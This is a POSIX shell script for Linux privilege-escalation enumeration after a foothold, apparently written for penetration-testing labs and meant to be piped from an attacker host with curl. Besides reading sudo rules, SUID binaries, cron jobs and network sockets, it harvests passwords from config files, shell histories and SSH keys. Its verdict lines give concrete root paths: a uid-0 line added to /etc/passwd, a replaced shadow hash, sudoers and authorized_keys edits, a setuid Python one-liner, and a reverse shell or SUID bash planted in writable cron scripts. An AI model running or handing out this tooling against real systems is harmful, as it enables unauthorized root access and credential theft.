#!/bin/sh
# postlin.sh - rasbora post-foothold Linux enumeration. Read only, verdict-first.
# curl http://KALI/postlin.sh | sh    (pwncat serves it)
# POSIX sh on purpose: runs on the dash/busybox boxes where bash is absent (Snookums had no python, barely bash).
# Every >> line is a verdict: what it means and the next move. They repeat at the end.

V=""   # collected verdicts
say() { printf '%s\n' "$*"; }
sec() { printf '\n\n==============================================================================\n  %s\n  %s\n==============================================================================\n' "$1" "$2"; }
sub() { printf '\n  -- %s --\n' "$1"; }
ver() { printf '  >> %s\n' "$1"; V="$V
  - $1"; }

printf '==============================================================================\n'
printf '  postlin.sh  rasbora post-foothold linux enumeration   %s\n' "$(date '+%Y-%m-%d %H:%M' 2>/dev/null)"
printf '  sections: 1 identity  2 sudo and suid  3 writable  4 credentials  5 scheduled  6 network  7 kernel/dist  8 verdicts\n'
printf '  >> lines are verdicts. They repeat in section 8. Read that first.\n'
printf '==============================================================================\n'

# ---------------------------------------------------------------- identity
sec "IDENTITY" "who you are, what you can become for free"
say "  $(id)"
say "  host  $(hostname 2>/dev/null)   $(uname -a)"
sub "other humans (uid >= 1000 with a shell)"
awk -F: '$3>=1000 && $3<60000 && $7 ~ /sh$/ {print "    "$1"  uid="$3"  "$6"  "$7}' /etc/passwd
sub "users with a login shell and uid 0 (should only be root)"
awk -F: '$3==0 {print "    "$1}' /etc/passwd
# a second uid-0 user is a backdoor you can log into if you know the pass
[ "$(awk -F: '$3==0' /etc/passwd | wc -l)" -gt 1 ] && ver "more than one uid-0 account in /etc/passwd: $(awk -F: '$3==0{printf "%s ",$1}' /etc/passwd)"

# ---------------------------------------------------------------- sudo and suid
sec "SUDO AND SUID" "the two fastest roots. Check every entry against gtfobins.github.io"
sub "sudo -l (no password first, then with one if you have it)"
SUDO="$(sudo -n -l 2>/dev/null)"
if [ -n "$SUDO" ]; then
    printf '%s\n' "$SUDO" | sed 's/^/    /'
    printf '%s\n' "$SUDO" | grep -q 'NOPASSWD' && ver "NOPASSWD entry above: run it, and if the binary is on GTFOBins it is an instant root shell"
    printf '%s\n' "$SUDO" | grep -qi '(ALL.*: *ALL) *ALL' && ver "sudo ALL:ALL: you can sudo anything with your own password"
    printf '%s\n' "$SUDO" | grep -qi 'env_keep.*LD_PRELOAD' && ver "env_keep LD_PRELOAD: compile a .so constructor and sudo with LD_PRELOAD=/tmp/x.so"
    printf '%s\n' "$SUDO" | grep -qi 'SETENV' && ver "SETENV in a sudo rule: pass PYTHONPATH/PERL5LIB/LD_* to the allowed command"
else
    say "    (sudo -n refused; run 'sudo -l' by hand once you have a password)"
fi
sub "SUID binaries (4000). Unusual ones are the privesc; compare with GTFOBins"
# print the full list, then flag the ones that are not standard
find / -perm -4000 -type f 2>/dev/null | while read -r f; do
    base=$(basename "$f")
    case "$base" in
        # the normal set: mention but do not flag
        ping|ping6|mount|umount|su|sudo|passwd|chsh|chfn|newgrp|gpasswd|pkexec|fusermount|fusermount3|mount.nfs|ntfs-3g|sg|unix_chkpwd|chage|crontab|at|ssh-keysign|dbus-daemon-launch-helper|polkit-agent-helper-1|snap-confine|vmware-user-suid-wrapper|Xorg.wrap)
            say "    $f" ;;
        *)
            say "  * $f   <- not standard" ;;
    esac
done
# pkexec present and old = CVE-2021-4034 (PwnKit), works on almost every 2021-and-earlier box
if [ -u /usr/bin/pkexec ] 2>/dev/null || [ -u /bin/pkexec ] 2>/dev/null; then
    ver "pkexec is SUID: if the box predates Jan 2022 it is PwnKit (CVE-2021-4034), self-contained exploit, reliable root"
fi
printf '  any line marked * : look it up on gtfobins.github.io under SUID. Found ones become a one-line root.\n'
sub "capabilities (getcap)"
getcap -r / 2>/dev/null | sed 's/^/    /'
getcap -r / 2>/dev/null | grep -q 'cap_setuid' && ver "a binary with cap_setuid: e.g. python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"
getcap -r / 2>/dev/null | grep -qi 'perl\|python\|ruby\|node\|tar\|gdb' && ver "a scripting/archive binary with capabilities above: GTFOBins has the Capabilities line for it"

# ---------------------------------------------------------------- writable
sec "WRITABLE" "files and dirs you can write that root reads or runs. The Snookums privesc was writable /etc/passwd"
sub "sensitive files writable by you"
for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts /root/.ssh/authorized_keys; do
    if [ -w "$f" ]; then
        say "    WRITABLE  $f"
        case "$f" in
            /etc/passwd) ver "/etc/passwd is writable: add a uid-0 line. openssl passwd -1 -salt x pass, then  root2:HASH:0:0::/root:/bin/bash  and su root2" ;;
            /etc/shadow) ver "/etc/shadow is writable: replace root's hash with one you know (openssl passwd -6)" ;;
            /etc/sudoers) ver "/etc/sudoers is writable: add  $(id -un) ALL=(ALL) NOPASSWD:ALL" ;;
            /root/.ssh/authorized_keys) ver "root's authorized_keys is writable: append your public key, ssh root@localhost" ;;
            *) ver "$f is writable: usable depending on what reads it" ;;
        esac
    fi
done
sub "writable dirs outside the usual world-writable ones (then check what runs from them)"
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp|var/lock|var/run)(/|$)' | grep -vE "$(id -un)" | head -40 | sed 's/^/    /'
sub "files writable by you under service and web roots"
find /etc /opt /srv /var/www /usr/local -writable 2>/dev/null | grep -vE '/(proc|sys)' | head -40 | sed 's/^/    /'

# ---------------------------------------------------------------- credentials
sec "CREDENTIALS" "config files, histories, keys, and the db creds that are reused for a shell user"
sub "web and app config (db.php, wp-config, .env, settings) with passwords"
for d in /var/www /var/www/html /opt /srv /usr/share/nginx /home; do
    [ -d "$d" ] || continue
    grep -rilE 'password|passwd|secret|api[_-]?key|DBPASS|DB_PASSWORD' "$d" 2>/dev/null | grep -vE '\.(js|css|map|min\.|po|mo)$' | head -20 | while read -r f; do
        say "    $f"
        grep -iE 'pass|secret|key|user|host|db' "$f" 2>/dev/null | grep -vE '^\s*(//|#|\*)' | head -6 | sed 's/^/        | /'
    done
done
[ -n "$(find /var/www /opt /srv -name 'db.php' -o -name 'wp-config.php' -o -name '.env' 2>/dev/null | head -1)" ] && ver "db/app config above holds a password: try it for every local user (su USER), for mysql, and for ssh. Reuse is the point"
sub "histories and keys"
for h in /root/.bash_history /home/*/.bash_history /home/*/.mysql_history /home/*/.*_history; do
    [ -r "$h" ] && [ -s "$h" ] && { say "    $h"; tail -20 "$h" 2>/dev/null | sed 's/^/        | /'; }
done
find / \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_dsa' -o -name '*.pem' -o -name '*.kdbx' \) 2>/dev/null | grep -vE '/(usr/share|usr/lib|proc)' | head -20 | sed 's/^/    key: /'
find / -name 'id_rsa' -readable 2>/dev/null | grep -vE '/usr' | head -1 | grep -q . && ver "a readable id_rsa above: chmod 600 it, try it as every username you know (keys get reused across users)"
sub "mysql/postgres reachable with found creds"
say "    found a db password? mysql -u root -p   then: select user,authentication_string from mysql.user;  (hashes to chash)"
say "    db creds often ARE the login for a human user on the box. Try su with them first"

# ---------------------------------------------------------------- scheduled
sec "SCHEDULED" "cron and timers. A root job touching a file or script you can write is root. If nothing shows, pspy"
sub "system cron"
for c in /etc/crontab /etc/cron.d/* ; do
    [ -r "$c" ] && { say "    $c"; grep -vE '^\s*(#|$)' "$c" 2>/dev/null | sed 's/^/        /'; }
done
ls -la /etc/cron.hourly /etc/cron.daily 2>/dev/null | grep -vE '^total|^d' | sed 's/^/    /'
sub "cron scripts you can write (this is the privesc when it exists)"
for c in /etc/crontab /etc/cron.d/*; do
    [ -r "$c" ] || continue
    # pull script paths out of cron lines and test writability
    grep -oE '/[A-Za-z0-9_./-]+\.(sh|py|pl|rb)' "$c" 2>/dev/null | sort -u | while read -r sp; do
        if [ -w "$sp" ]; then
            say "    WRITABLE cron target: $sp"
            ver "cron runs $sp and you can write it: put a reverse shell or 'cp /bin/bash /tmp/b; chmod +s /tmp/b' in it, wait for the interval"
        else
            say "    cron target (not writable): $sp"
        fi
    done
done
printf '  nothing writable but jobs clearly run? you cannot see root crontab: pspy64 for 5 minutes (pwncat serves it)\n'
ver "run pspy64 for 5 minutes regardless: it catches root cron and service restarts that are invisible in /etc/cron (Aero)"

# ---------------------------------------------------------------- network
sec "NETWORK" "localhost-only services are new targets. Tunnel them (ligolo 240.0.0.1:PORT) and enumerate"
sub "listening sockets"
if command -v ss >/dev/null 2>&1; then ss -lntup 2>/dev/null | sed 's/^/    /'; else netstat -lntup 2>/dev/null | sed 's/^/    /'; fi
printf '    127.0.0.1 ports above are not in your nmap. Each is a service to tunnel and run this whole guide against\n'
sub "this host's addresses"
ip -4 addr 2>/dev/null | grep inet | sed 's/^/    /' || ifconfig 2>/dev/null | grep inet | sed 's/^/    /'

# ---------------------------------------------------------------- kernel/dist
sec "KERNEL AND DISTRO" "last resort. A matching kernel exploit is real but fragile; try everything above first"
say "  $(uname -r)   $(cat /etc/*-release 2>/dev/null | grep -iE 'pretty|^name=' | head -1)"
say "  search: searchsploit linux kernel $(uname -r | cut -d- -f1)   and 'dirtypipe' (5.8-5.16.11), 'dirtycow' (<4.8.3), 'pwnkit' (pkexec)"
ver "note the kernel and distro, but kernel exploits are the last option: sudo, suid, writable, cron and creds come first"

# ---------------------------------------------------------------- verdicts
sec "VERDICTS" "every >> line above. Start here."
if [ -z "$V" ]; then
    say "  (none fired automatically. Read SUDO AND SUID against GTFOBins, WRITABLE, and the localhost sockets by hand)"
else
    printf '%s\n' "$V"
fi
printf '\n  done. take this output home: it is the enumeration evidence for the report.\n'
printf '  linpeas for what this misses (read it bottom to top); pspy64 for timing. Both via pwncat.\n'
